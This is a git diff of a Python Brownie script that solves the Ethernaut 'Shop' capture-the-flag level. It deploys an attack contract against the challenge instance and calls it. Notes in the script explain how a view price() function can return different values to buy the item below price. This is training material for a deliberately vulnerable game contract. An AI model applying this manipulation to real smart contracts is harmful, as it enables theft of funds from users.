@@ -3,15 +3,24 @@ from brownie import web3, interface, convert, Attack21
 from eth_utils import keccak
 
 
-ETHERNAUT_INSTANCE = "0x4be13f805226d0e5d3e5069c4518e38FE574e0a8"
+ETHERNAUT_INSTANCE = "0x6870B6aEDBde8ccAe9694B271b8A32f44A274A42"
 GAS_LIMIT = 6000000
 
 
 def main():
 
     player = get_account()
-    # target = interface.IShop(ETHERNAUT_INSTANCE)
-    attack = Attack21.deploy({"from": player})
+    target = interface.IShop(ETHERNAUT_INSTANCE)
+    attack = Attack21.deploy(ETHERNAUT_INSTANCE, {"from": player})
+
+    sold_flag = target.isSold.call({"from": player})
+    print(f"\nisSold = {sold_flag}\n")
+
+    attack.attack({"from": player})
+
+    sold_flag = target.isSold.call({"from": player})
+    print(f"\nis the item sold : {sold_flag}\n")
+
     attack.attack({"from": player})
 
 
@@ -23,9 +32,10 @@ def main():
     
     - make the following == True to win:
         -- (_buyer.price() >= price && !isSold) 
+        -- where _buyer.price() calls the price() function in Attack21
 
-    - where _buyer.price() calls the price() function in Attack21
+    - price() view only, but we can still return different uint values
 
-    - issue: price() has the view modifier ???
+    - challenge puts no restriction on number of times we can attempt to win
 
 """
